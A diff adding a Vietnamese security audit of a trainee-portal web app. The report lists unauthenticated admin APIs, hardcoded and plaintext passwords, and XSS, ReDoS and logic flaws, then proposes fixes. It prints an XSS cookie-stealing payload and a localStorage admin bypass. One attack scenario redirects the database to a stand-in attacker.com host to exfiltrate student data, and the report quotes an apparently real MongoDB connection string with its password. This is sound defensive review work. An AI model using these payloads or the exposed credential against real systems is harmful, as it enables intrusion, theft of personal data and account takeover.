@@ -1,0 +1,171 @@
+Báo cáo phân tích mã nguồn — Trainee Portal 2026
+0. Tổng quan kiến trúc
+Backend: Express 4.21 + Mongoose 8 + dotenv, chạy đơn process server.js (730 dòng), toàn bộ business logic dồn vào config/db.js (1878 dòng).
+Frontend: SPA thuần JS (public/js/app.js ~5893 dòng, scheduleData.js, duolingo.js, chart.js, api.js).
+DB: MongoDB Atlas (chuỗi kết nối thật trong .env).
+Mô hình xác thực hiện tại: chỉ có tài khoản admin/1234 hardcode; sinh viên/khách không cần đăng nhập mà xem trực tiếp.
+I. BẢO MẬT (ưu tiên hàng đầu)
+Trả lời trực tiếp câu hỏi của bạn:
+CÓ. Tài khoản admin chắc chắn bị tấn công ngay khi lên production. Thực chất attacker không cần "đánh cắp" tài khoản admin, vì toàn bộ API admin đều mở trắng không cần xác thực. Mật khẩu admin còn được ghi rõ trong source code (admin/1234). Dưới đây là các lỗ hổng cụ thể.
+
+🔴 S1. Không có bất kỳ cơ chế xác thực/phân quyền nào trên API (NGHIÊM TRỌNG NHẤT)
+Toàn bộ các route ghi chú (Chỉ Admin) chỉ là comment, không có một middleware nào kiểm tra quyền. Tôi đã grep xác nhận: không có Authorization, req.session, req.user, JWT, session, cookie ở bất kỳ đâu.
+
+Kết quả: bất kỳ ai (kể cả bot) gọi thẳng được:
+
+Code block
+
+
+POST /api/trainees            → tạo sinh viên
+PUT  /api/trainees/:id        → sửa điểm/sao/buổi học
+DELETE /api/trainees/:id      → xóa sinh viên
+POST /api/schedules           → thêm buổi học
+PUT/DELETE /api/schedules/:id → sửa/xóa lịch
+POST /api/admin/award-session-stars
+POST /api/admin/batch-update-session-stars
+DELETE /api/admin/session-stars/...
+PUT  /api/questions/:id/answer → giả danh giảng viên trả lời
+DELETE /api/questions/:id
+PUT  /api/assignments/:id / POST /api/assignments/batch / reset
+GET/PUT/DELETE /api/requests  → đọc và xử lý yêu cầu hỗ trợ
+Việc "chặn" admin ở frontend (switchTab('admin') chỉ kiểm tra state.currentUser.role trong localStorage) là ảo — chỉ cần gõ localStorage.setItem('uit_trainee_auth_user', JSON.stringify({role:'admin'})) là mở được UI admin, và API thì chẳng cần làm vậy vì nó vốn đã mở.
+
+Hậu quả thực tế: attacker có thể xóa toàn bộ dữ liệu sinh viên, sửa điểm, đổi mật khẩu mọi tài khoản, gán link MS Teams giả để phishing sinh viên.
+
+🔴 S2. Thông tin đăng nhập MongoDB thật nằm trong .env (plaintext) và không có .gitignore
+File .env chứa chuỗi kết nối thật:
+
+Code block
+
+
+MONGODB_URI=mongodb+srv://anhkhoi11077_db_user:khoi1101@portal-tp.rvs1iso.mongodb.net/...
+Không có .gitignore (tôi đã kiểm tra, thư mục hiện chưa phải git repo, nhưng ngay khi git init + push thì password này lộ công khai).
+Mật khẩu DB là khoi1101 — rất yếu, liên quan trực tiếp tới username.
+Ai có chuỗi này = toàn quyền đọc/ghi/xóa database.
+Khuyến nghị: xoay ngay password MongoDB, dùng biến môi trường (không commit .env), thêm .gitignore, dùng secret manager.
+
+🔴 S3. Credential admin hardcode trong source code
+config/db.js:486-498:
+
+js
+
+
+if (uLower === 'admin') {
+  if (p === '1234') { return { success: true, user: { role: 'admin', ... } } }
+}
+Kèm cả comment ở server.js:110: // admin / 1234. Ngoài ra mật khẩu mặc định của mọi sinh viên cũng là 1234 (models/Trainee.js:120, config/db.js:347).
+
+Hậu quả: admin login bị brute-force trong một lần thử (vì mật khẩu là hằng số), và không có rate limit nào cả.
+
+🔴 S4. Stored XSS ở nhiều nơi (do innerHTML không escape)
+Frontend dùng innerHTML với dữ liệu người dùng không qua escapeHtml ở rất nhiều chỗ. Hàm escapeHtml có tồn tại (app.js:3005) và được dùng ~100 chỗ, nhưng thiếu sót hàng loạt:
+
+Vị trí	Dữ liệu không escape	Nguồn dữ liệu
+scheduleData.js:580-693 (render lịch tháng)	item.title, instructor, room, note, teamsUrl, code, startTime, periods, type	Schedule (DB) — ghi được không cần auth
+app.js:1393-1429 (lịch hôm nay)	item.title, roomText, instructorText, codeText, timeRange, periodText, item.type	Schedule
+app.js:1499-1505 (thông báo)	item.title, item.category, item.link	Announcement
+app.js:1734-1780 (modal chi tiết SV)	trainee.fullName, traineeId, batch, email, bio, skills[]	Trainee (bio/skills ghi được qua updateTrainee)
+app.js:1660-1699 (bảng xếp hạng)	t.track, t.department, t.batch, t.status	Trainee
+app.js:1696	onclick="openTraineeDetail('${t.traineeId}')" (không escape traineeId)	Trainee
+duolingo.js:279-285, 368-376	item.title (title attr), currentItem.link (href trực tiếp)	Assignment
+Chuỗi khai thác đầy đủ (dễ): attacker gọi POST /api/schedules với title = "<img src=x onerror=alert(document.cookie)>" → lưu vào MongoDB → mọi visitor mở trang lịch đều bị chạy script. Với assignment.link = "javascript:..." thì bấm nút bài tập cũng thực thi.
+
+Phần Q&A forum (app.js:5510-5547) thì được làm đúng hơn (dùng textContent), cho thấy dev có ý thức nhưng áp dụng không nhất quán.
+
+🔴 S5. Endpoint /api/config/mongodb không xác thực → chiếm quyền DB, ghi đè .env
+server.js:335-376: nhận uri bất kỳ (chỉ cần bắt đầu mongodb), ghi đè trực tiếp file .env trên server, set process.env.MONGODB_URI, rồi connectDB().
+
+Hậu quả: attacker không cần đọc .env — họ có thể:
+
+Trỏ server vào MongoDB của chính họ → toàn bộ dữ liệu sinh viên sau đó đọc/ghi vào DB attacker (exfiltration toàn bộ PII: email, số điện thoại mentor, điểm, MSSV).
+Gây DoS bằng cách trỏ vào URI sai khiến server mất kết nối.
+Đây là lỗi đặc biệt nguy hiểm vì nó cho phép ghi file config từ xa.
+
+🔴 S6. Mật khẩu lưu plaintext, không hash
+models/Trainee.js:120 default '1234', createTrainee (db.js:347) lưu password nguyên văn, resolveSupportRequest (db.js:872) còn lưu request.resolvedPassword = passToSet (plaintext) vào DB.
+
+Mỉa mai là bài tập số 6 của chính dự án dạy "bcrypt + JWT" (db.js:1641-1652), nhưng hệ thống thật lại không áp dụng.
+
+🔴 S7. CORS mở toàn bộ → rò rỉ dữ liệu cá nhân cross-origin
+server.js:44: app.use(cors()) — mặc định Access-Control-Allow-Origin: *. Vì API không cần auth nên bất kỳ website nào mở trong trình duyệt người dùng đều có thể fetch('http://<host>/api/trainees') và đọc toàn bộ dữ liệu sinh viên (email, sđt, điểm, MSSV). Đây là rò rỉ PII nghiêm trọng.
+
+🟠 S8. Lỗi logic "đổi mật khẩu" cho phép reset mà không cần mật khẩu cũ
+server.js:154:
+
+js
+
+
+if (currentPassword && trainee.password &&
+    trainee.password !== currentPassword.trim() &&
+    trainee.password !== '1234') { return lỗi }
+Vì mọi sinh viên đều có mật khẩu mặc định '1234', điều kiện trainee.password !== '1234' = false → toàn bộ biểu thức = false → bỏ qua kiểm tra mật khẩu cũ. Nghĩa là: gọi POST /api/auth/change-password với traineeId + newPassword bất kỳ (kèm currentPassword sai cũng được) là đổi được mật khẩu của bất kỳ sinh viên nào.
+
+🟠 S9. ReDoS / regex injection qua tham số người dùng
+config/db.js:125-129: search đưa thẳng vào $regex: search (không escape) → pattern kiểu (a+)+$ gây ReDoS, treo CPU server.
+config/db.js:456: new RegExp('^' + cleanId + '$', 'i') với cleanId do client truyền → có thể inject regex + ReDoS.
+Cả hai đều không cần auth → vector DoS.
+
+🟠 S10. Mass assignment trên Trainee
+createTrainee (db.js:329-349) và updateTrainee (db.js:417-421) dùng ...data / $set: updateData trực tiếp → attacker ghi được mọi trường: role (kể cả 'admin'), password, traineeId, email, bio, skills... Không có whitelist trường.
+
+🟡 S11–S13 (mức trung bình nhưng nên xử lý)
+Lộ thông tin lỗi: các handler 500 trả error: err.message (server.js:82, 105, 129...) → leak nội bộ (path, tên model, lỗi MongoDB...).
+Không có helmet / security headers (CSP, X-Frame-Options, X-Content-Type-Options...) → dễ clickjacking và khó chặn XSS.
+Không rate limit trên /api/auth/login → brute-force thoải mái (dù mật khẩu là hằng số nên không cần brute).
+express.json({limit:'10mb'}) không giới hạn tổng → upload avatar base64 lớn làm đầy DB.
+II. LỖI LOGIC
+#	Vị trí	Mô tả
+L1	db.js:277-287 getTraineeById	Khi không tìm thấy MSSV, trả về sinh viên top-1 thay vì null → route 404 ở server.js:91 gần như không bao giờ chạy khi DB có dữ liệu; client không phân biệt được "sai mã" vs "đúng".
+L2	db.js:123-136 getAllTrainees	Khi truyền cả search và track, query.$or của track ghi đè $or của search → không thể lọc kết hợp search + track.
+L3	server.js:154 (đã nêu ở S8)	Điều kiện đổi mật khẩu sai, bỏ qua xác thực mật khẩu cũ.
+L4	db.js:169-224 attachRealStarHistory	Nếu sessionStars trống, tự "bịa" ra 4 buổi + sao theo tỷ lệ → dữ liệu giả được hiển thị như thật, gây hiểu nhầm điểm.
+L5	db.js:327 createTrainee	assignmentScore không hợp lệ thì gán cứng 8.0 → tạo điểm giả thay vì báo lỗi.
+L6	db.js:50-73 syncRanksByStars	Mỗi request thay đổi là vòng lặp find() + N lần save() tuần tự, và được gọi lại sau mỗi lần tạo/sửa/xóa → kém hiệu quả, dễ nghẽn khi nhiều SV.
+L7	server.js:321-332 resetSchedules	reseed mặc định true → 1 request xóa sạch + seed lại lịch; không có confirm server-side.
+L8	db.js:845-880 resolveSupportRequest	Khớp trainee theo traineeId hoặc email từ request — mà request do client tự tạo (createSupportRequest) → attacker tự submit yêu cầu cho MSSV nạn nhân rồi gọi resolve (không auth) để reset mật khẩu nạn nhân.
+L9	db.js:709-714 updateSchedule / 734-739 deleteSchedule	Khi id không phải ObjectId hợp lệ, findOneAndUpdate({_id:id}) ném CastError thay vì trả 404 gọn.
+L10	app.js:1325, scheduleData.js:760	"Ngày hôm nay" hardcode 2026-10-27 → qua ngày khác, tính năng "lịch hôm nay" luôn sai.
+L11	server.js:713-716	Fallback app.get('*') bắt cả GET /api/... không tồn tại → API 404 trả về HTML thay vì JSON.
+III. LỖI UI / FRONTEND
+Element reference chết (null): app.js tham chiếu openMongoModalBtn, dbStatusButton, closeLoginModalBtn, loginModal, loginFeedbackAlert, btnQuickAdminLogin, btnQuickStudentLogin... nhưng các id này không tồn tại trong index.html (tôi đã grep xác nhận). Nhờ có guard if (element) nên không crash, nhưng chức năng "Cấu hình MongoDB" từ header không có đường mở (dù modal mongoConfigModal vẫn có ở index.html:2648).
+Bảo vệ "chỉ admin thấy điểm số" chỉ là che client: ở bảng xếp hạng (app.js:1647-1658) và modal (app.js:1730) có nhánh ẩn điểm đối với non-admin, nhưng API /api/trainees vẫn trả assignmentScore cho tất cả → thông tin điểm vẫn lộ.
+Không nhất quán escape → nhiều nơi dùng innerHTML với dữ liệu (đã nêu S4), vừa là bug XSS vừa là bug hiển thị khi dữ liệu chứa <.
+switchTab('dashboard') và 'profile' đều redirect sang 'schedule' (app.js:978-980) → hai view Dashboard/Profile bị "nuốt", UI chết.
+Avatar upload đọc file → base64 data-URI → lưu thẳng MongoDB qua updateTrainee, không validate loại file (cho phép SVG), không giới hạn kích thước hợp lý.
+Comment trùng lặp // Admin View Toolbar Events (app.js:756-758) — lỗi thẩm mỹ nhỏ.
+localStorage lưu cả đối tượng user có chứa avatar → nguy cơ QuotaExceededError (đã có try/catch xử lý, nhưng vẫn là dấu hiệu lưu dữ liệu không cần thiết).
+IV. ĐỀ XUẤT CẢI TIẾN (theo thứ tự ưu tiên)
+Bước 1 — Chặn máu ngay (production blocker)
+Xóa/xoay ngay credential thật trong .env, đổi password MongoDB, thêm .gitignore (node_modules/, .env).
+Thêm middleware requireAdmin cho mọi route (Chỉ Admin):
+js
+
+
+function requireAdmin(req, res, next) {
+  const token = req.headers.authorization;
+  if (!token || !verifyJwt(token)) return res.status(401).json({ success:false, message:'Unauthorized' });
+  if (req.user?.role !== 'admin') return res.status(403).json({ success:false, message:'Forbidden' });
+  next();
+}
+app.post('/api/trainees', requireAdmin, ...);
+Kèm JWT (đăng nhập xong cấp token có role, exp). Đây là thay đổi quan trọng nhất.
+Bỏ endpoint /api/config/mongodb hoặc gắn requireAdmin + chỉ cho phép cấu hình từ localhost.
+Hash mật khẩu bằng bcrypt (xóa default 1234), và sửa lỗi logic đổi mật khẩu ở server.js:154.
+Chặn admin hardcode → lưu admin trong DB với mật khẩu bcrypt, buộc đổi mật khẩu lần đầu.
+Bước 2 — Chống XSS / input
+Thống nhất output-encoding: bắt buộc dùng escapeHtml() hoặc textContent cho mọi dữ liệu render (đặc biệt Schedule, Announcement, Trainee.bio/skills, Assignment.link). Hoặc dùng template engine auto-escape (EJS/Handlebars) / framework (React).
+Validate input server-side: whitelist trường cho createTrainee/updateTrainee (bỏ mass assignment), validate traineeId (chỉ số, độ dài), validate assignment.link chỉ cho https://.
+Escape regex cho search/deleteTrainee (hoặc dùng $text index thay vì $regex).
+Bước 3 — Hardening
+CORS: chỉ cho origin cụ thể (cấu hình env), không *.
+helmet + CSP, rate-limit login (vd express-rate-limit), giới hạn body 1–2mb, chặn upload SVG.
+Không trả err.message ra client; log server-side, trả thông báo chung chung.
+Bước 4 — Sửa logic/UI
+Sửa getTraineeById trả null đúng nghĩa (L1), sửa ghi đè $or search+track (L2), sửa updateSchedule/deleteSchedule xử lý id không hợp lệ (L9), bỏ hardcode "today" (L10).
+Tối ưu syncRanksByStars bằng bulkWrite (L6); cân nhắc đưa xếp hạng sang aggregation thay vì lưu cố định.
+Nối lại các element null / dọn UI chết (dashboard/profile switch, nút cấu hình MongoDB).
+V. Kịch bản tấn công thực tế vào admin khi lên production (minh họa)
+Kịch bản A — chiếm DB không cần đăng nhập: attacker POST /api/config/mongodb {"uri":"mongodb://attacker.com:27017"} → server ghi .env, chuyển hướng kết nối → toàn bộ dữ liệu sinh viên chảy về DB của attacker.
+Kịch bản B — phá hoại dữ liệu: attacker DELETE /api/trainees/25520918 (hoặc lặp qua tất cả) → xóa sạch sinh viên; hoặc POST /api/schedules/reset → xóa lịch.
+Kịch bản C — XSS chiếm session/quyền admin: attacker gửi schedule có <img onerror> → script chạy trong trình duyệt của admin thật khi admin mở trang lịch → đọc localStorage.uit_trainee_auth_user / thay đổi giao diện admin.
+Kịch bản D — account takeover sinh viên: vì change-password bỏ qua mật khẩu cũ (S8) và resolve không auth (L8), attacker đổi mật khẩu bất kỳ sinh viên nào.
